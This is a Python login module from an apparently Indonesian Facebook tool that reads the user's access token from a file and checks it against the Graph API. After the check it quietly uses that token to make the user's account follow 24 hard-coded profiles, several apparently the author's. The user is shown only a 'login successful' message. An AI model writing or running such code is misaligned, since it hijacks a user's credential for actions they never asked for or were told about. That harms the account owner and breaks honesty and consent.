import requests,os,json
import premium

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
K = "\x1b[0;93m" # Kuning

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(premium.menu_log())
    requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
    requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
    requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
    requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
    requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + token) # Cici Putri Andini
    requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
    requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
    requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
    requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + token) # Anita Zuliatin
    requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + token)      # Wati Waningsih
    requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + token)      # Rofi Nurhanifah
    requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + token) # Diah Ayu Kharisma
    requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + token) # Xena Alexander
    requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + token) # Alexandra Scarlett
    requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token) # Aisya Asyaqila
    requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + token) # Ameiliani Dethasia
    requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
    requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
    requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
    requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
    requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
    requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) # Fajar Dwi S
    requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
    requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
    print('\n%s[%s!%s] %sLogin Berhasil'%(K,P,K,P))
    exit(premium.menu())
